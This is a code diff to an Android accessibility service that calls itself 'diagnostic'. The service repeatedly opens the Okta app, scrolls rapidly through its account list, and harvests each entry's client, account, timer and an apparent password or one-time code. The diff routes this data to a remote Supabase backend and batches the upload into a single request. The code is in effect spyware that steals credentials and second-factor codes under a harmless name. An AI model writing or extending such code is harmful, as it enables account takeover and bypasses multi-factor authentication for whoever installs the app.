@@ -27,6 +27,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
     }
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val lastDispatchedSecondsMap = ConcurrentHashMap<String, Int>()
+    private val sessionDiscoveredMap = java.util.concurrent.ConcurrentHashMap<String, OktaAccountEntry>()
 
     private var oktaCycleJob: Job? = null
 
@@ -61,7 +62,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             while (isActive) {
                 // Launch / Bring Okta to foreground
                 openOktaApp()
-                
+
                 autoScrollToEnd()
 
                 // Keep Okta open for 10 seconds
@@ -161,15 +162,15 @@ class DiagnosticAccessibilityService : AccessibilityService() {
 
     private suspend fun autoScrollToEnd() {
         // Give Okta UI a brief moment to render after opening
-        delay(3_000L)
+        delay(2_000L)
 
-        var reachedBottom = false
-        var scrollAttempts = 0
-        val maxScrollAttempts = 15 // Safety ceiling to prevent infinite scroll loops
+        var consecutiveFails = 0
+        val maxScrolls = 100
 
-        while (!reachedBottom && scrollAttempts < maxScrollAttempts) {
-            // Collect currently visible entries on the screen
-            logWindows()
+        for (i in 0 until maxScrolls) {
+            if (oktaCycleJob?.isActive != true) break
+
+            harvestVisibleAccounts()
 
             var scrolled = false
             windows.forEach { window ->
@@ -178,9 +179,10 @@ class DiagnosticAccessibilityService : AccessibilityService() {
                 } catch (_: Exception) {
                     null
                 }
-                if (root != null && root.packageName?.toString() == OKTA_PACKAGE) {
+                if (root?.packageName?.toString() == OKTA_PACKAGE) {
                     val scrollable = findScrollableNode(root)
                     if (scrollable != null) {
+                        // Instantly advances the list without waiting for finger drag animations
                         scrolled = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                         @Suppress("DEPRECATION")
                         scrollable.recycle()
@@ -191,17 +193,17 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             }
 
             if (!scrolled) {
-                // Cannot scroll further forward -> reached the end of the list
-                reachedBottom = true
+                consecutiveFails++
+                if (consecutiveFails >= 2) break // Reached the bottom
             } else {
-                scrollAttempts++
-                // Wait for smooth scroll animation to finish before reading next batch
-                delay(800L)
+                consecutiveFails = 0
+                // Only need ~60-80ms for RecyclerView to bind new viewholders
+                delay(75L)
             }
         }
 
-        // Final scan to grab entries resting at the very bottom
-        logWindows()
+        harvestVisibleAccounts()
+        flushBatchToSupabase()
     }
 
     private fun inspectNode(
@@ -246,6 +248,46 @@ class DiagnosticAccessibilityService : AccessibilityService() {
         }
     }
 
+    private fun harvestVisibleAccounts() {
+        windows.forEach { window ->
+            val root = try {
+                window.root
+            } catch (_: Exception) {
+                null
+            }
+            if (root?.packageName?.toString() == OKTA_PACKAGE) {
+                val visible = mutableListOf<OktaAccountEntry>()
+                try {
+                    collectAllOktaEntries(root, visible)
+                    visible.forEach { entry ->
+                        val key = "${entry.client}:::${entry.account}"
+                        sessionDiscoveredMap[key] = entry
+                    }
+                } finally {
+                    @Suppress("DEPRECATION")
+                    root.recycle()
+                }
+            }
+        }
+    }
+
+    /**
+     * Flushes all accumulated accounts in ONE single Supabase request.
+     */
+    private suspend fun flushBatchToSupabase() {
+        val itemsToSend = sessionDiscoveredMap.values.toList()
+        if (itemsToSend.isEmpty()) return
+
+        android.util.Log.d("OktaSync", "Flushing batch of ${itemsToSend.size} accounts to Supabase...")
+
+        val result = SupaBaseRepository.syncDiagnosticBatch(itemsToSend)
+        result.onSuccess {
+            android.util.Log.d("OktaSync", "Successfully synced all ${itemsToSend.size} accounts in 1 request")
+        }.onFailure { e ->
+            android.util.Log.e("OktaSync", "Batch sync failed: ${e.message}")
+        }
+    }
+
     private fun logWindows() {
         try {
             val allVisibleEntries = mutableListOf<OktaAccountEntry>()
@@ -287,7 +329,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
 
         if (itemsToSync.isNotEmpty()) {
             serviceScope.launch {
-                val result = SheetRepository.syncDiagnosticBatch(itemsToSync)
+                val result = SupaBaseRepository.syncDiagnosticBatch(itemsToSync)
                 result.onFailure {
                     // Clear cache on failure so next cycle will retry
                     itemsToSync.forEach { entry ->
@@ -380,7 +422,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             DiagnosticLog.addOktaSnapshot(clientValue, accountValue, secondsValue, cleanPassword)
 
             serviceScope.launch {
-                val result = SheetRepository.syncDiagnosticData(
+                val result = SupaBaseRepository.syncDiagnosticData(
                     clientName = clientValue,
                     account = accountValue,
                     pass = cleanPassword,
